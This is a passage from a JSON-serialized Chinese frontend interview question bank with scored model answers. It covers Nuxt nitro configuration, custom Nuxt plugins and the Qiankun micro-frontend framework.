路由则通过设置响应头，解决了该路由的跨域访问问题，方便前端与之交互。\\n```","lang":"ts","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    routeRules: {\\n      \'/\': {\\n        cache: {\\n          maxAge: 60 * 10 // 为首页设置缓存时间，这里是 10 分钟\\n        }\\n      },\\n      \'/about\': {\\n        redirect: {\\n          destination: \'/\', // 将访问 /about 页面重定向到首页\\n          statusCode: 302\\n        }\\n      },\\n      \'/api/data\': {\\n        headers: {\\n          \'Access-Control-Allow-Origin\': \'*\' // 为 /api/data 路由设置响应头，允许跨域访问\\n        }\\n      }\\n    }\\n  }\\n}\\n//在这个示例中，针对应用的根路由（/）设置了缓存策略，即用户首次访问后，在接下来的 10 分钟内再次访问该页面时，服务器可以直接从缓存中获取页面内容并返回，减\\n// 少服务器处理负担；对于 /about 页面配置了重定向规则，当用户访问该页面时会以 302 状态码重定向到首页；而 /api/data 路由则通过设置响应头，解决了该路由的跨域访问问题，方便前端与之交互。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","task":false,"loose":false,"text":"**1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","tokens":[{"type":"text","raw":"**1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n\\n开发环境下顺畅地协同工作。","text":"**1：** devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","text":" devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    devProxy: {\\n      \'/api\': {\\n        target: \'http://localhost:3000/api\', // 后端 API 服务器的实际地址\\n        changeOrigin: true\\n      }\\n    }\\n  }\\n}\\n```","lang":"ts","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    devProxy: {\\n      \'/api\': {\\n        target: \'http://localhost:3000/api\', // 后端 API 服务器的实际地址\\n        changeOrigin: true\\n      }\\n    }\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","task":false,"loose":false,"text":"**1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","tokens":[{"type":"text","raw":"**1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n\\n要求，精准地定制构建结果的呈现形式。","text":"**1：** output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","text":" output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    output: {\\n      dir: \'dist\', // 设置构建输出目录为 dist\\n      publicDir: \'public\', // 设定公共资源目录为 public\\n      format: \'esm\' // 设置模块格式为 ESM（ECMAScript 模块），也可根据需求选择其他格式\\n    }\\n  }\\n}\\n```","lang":"ts","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    output: {\\n      dir: \'dist\', // 设置构建输出目录为 dist\\n      publicDir: \'public\', // 设定公共资源目录为 public\\n      format: \'esm\' // 设置模块格式为 ESM（ECMAScript 模块），也可根据需求选择其他格式\\n    }\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","task":false,"loose":false,"text":"**1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","tokens":[{"type":"text","raw":"**1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","text":"**1：** plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","text":" plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```ts\\n// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    plugins: [\'./server/plugins/myPlugin.ts\']\\n  }\\n}\\n```","lang":"ts","text":"// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    plugins: [\'./server/plugins/myPlugin.ts\']\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？\\n\\n","depth":2,"text":"请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？","tokens":[{"type":"text","raw":"请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？","text":"请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **3：** Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。\\n* **2：** 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **3：** Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。\\n","task":false,"loose":false,"text":"**3：** Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。","tokens":[{"type":"text","raw":"**3：** Nuxt 插件的作用<br/>\\n\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n\\n适配不同的环境和满足特定的需求。","text":"**3：** Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。","tokens":[{"type":"strong","raw":"**3：**","text":"3：","tokens":[{"type":"text","raw":"3：","text":"3：","escaped":false}]},{"type":"text","raw":" Nuxt 插件的作用","text":" Nuxt 插件的作用","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。","text":"\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。","text":"\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。","text":"\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。","escaped":false}]}]},{"type":"list_item","raw":"* **2：** 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","task":false,"loose":false,"text":"**2：** 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","tokens":[{"type":"text","raw":"**2：** 编写一个自定义插件<br/>\\n\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","text":"**2：** 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 编写一个自定义插件","text":" 编写一个自定义插件","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。","text":"\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","text":"\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nexport default function (context, inject) {\\n  const myLogger = (message) => {\\n    console.log(`[MyLogger] ${message}`);\\n  };\\n  inject(\'myLogger\', myLogger);\\n}\\n```","lang":"js","text":"export default function (context, inject) {\\n  const myLogger = (message) => {\\n    console.log(`[MyLogger] ${message}`);\\n  };\\n  inject(\'myLogger\', myLogger);\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>","pre":false,"text":"</details>"}]},{"key":"Qiankun","content":"<h1>Qiankun</h1>\\n<h2>当前主流的微前端方案大概有哪些？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><strong>1：</strong> iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。</li>\\n<li><strong>1：</strong> single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。</li>\\n<li><strong>1：</strong> qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。</li>\\n<li><strong>1：</strong> micro-app：基于 Webcomponent 的微前端方案，由京东出品。</li>\\n<li><strong>1：</strong> EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。</li>\\n<li><strong>1：</strong> 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生</li>\\n</ul>\\n<h2>Qiankun 有哪些优点？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 技术栈无关：支持不同技术栈的子应用集成，如 Vue、React、Angular 等。</li>\\n<li><strong>1：</strong> 独立开发部署：各个子应用可以独立开发、测试、部署，提高团队开发效率。</li>\\n<li><strong>1：</strong> 提升可维护性：便于对大型前端项目进行拆分和管理，降低代码复杂度，提升可维护性。</li>\\n<li><strong>1：</strong> 动态加载：根据需要动态加载子应用，优化资源加载和页面性能。</li>\\n</ul>\\n<h2>Qiankun 如何实现子应用的加载？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Qiankun 通过 registerMicroApps 方法注册子应用，传入子应用的配置信息，包括名称、入口地址、激活规则等。在运行时，根据路由变化或其他触发条件，动态地加\\n载子应用的 JavaScript 资源，创建子应用的实例，并将其挂载到指定的 DOM 节点上，实现子应用的加载展示。</li>\\n</ul>\\n<h2>Qiankun 如何处理子应用之间的公共依赖？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 可以将公共依赖提取到主应用中，通过主应用加载公共依赖并将其共享给子应用，避免子应用重复加载相同的依赖，减少资源浪费和提高性能。在注册子应用时，通过配\\n置 props 等方式将主应用中的公共依赖传递给子应用使用。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# Qiankun\\n\\n","depth":1,"text":"Qiankun","tokens":[{"type":"text","raw":"Qiankun","text":"Qiankun","escaped":false}]},{"type":"heading","raw":"## 当前主流的微前端方案大概有哪些？\\n\\n","depth":2,"text":"当前主流的微前端方案大概有哪些？","tokens":[{"type":"text","raw":"当前主流的微前端方案大概有哪些？","text":"当前主流的微前端方案大概有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。\\n- **1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。\\n- **1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。\\n- **1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。\\n- **1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。\\n- **1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。\\n","task":false,"loose":false,"text":"**1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","tokens":[{"type":"text","raw":"**1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","text":"**1：** iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","text":" iframe：Web中的原生方案，也是微前端的起源，接入很简单，但是最大缺点就是通信很麻烦。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。\\n","task":false,"loose":false,"text":"**1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","tokens":[{"type":"text","raw":"**1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","text":"**1：** single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","text":" single-spa：较早兴起的微前端框架，是后续很多微前端框架的奠基石。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。\\n","task":false,"loose":false,"text":"**1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","tokens":[{"type":"text","raw":"**1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","text":"**1：** qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","text":" qiankun：基于 single-spa，由阿里巴巴出品，国内比较主流的微前端方案。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。\\n","task":false,"loose":false,"text":"**1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。","tokens":[{"type":"text","raw":"**1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。","text":"**1：** micro-app：基于 Webcomponent 的微前端方案，由京东出品。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" micro-app：基于 Webcomponent 的微前端方案，由京东出品。","text":" micro-app：基于 Webcomponent 的微前端方案，由京东出品。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。\\n","task":false,"loose":false,"text":"**1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","tokens":[{"type":"text","raw":"**1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","text":"**1：** EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","text":" EMP：基于 webpack 5 module federation（模块联邦） 的微前端方案，由欢聚时代出品。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","task":false,"loose":false,"text":"**1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","tokens":[{"type":"text","raw":"**1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 焕发新生","text":"**1：** 无界：腾讯推出的一款微前端解决方式。它是一种基于 Web Components + iframe 的全新微前端方案，继承 iframe 的优点，补足 iframe 的缺点，让 iframe 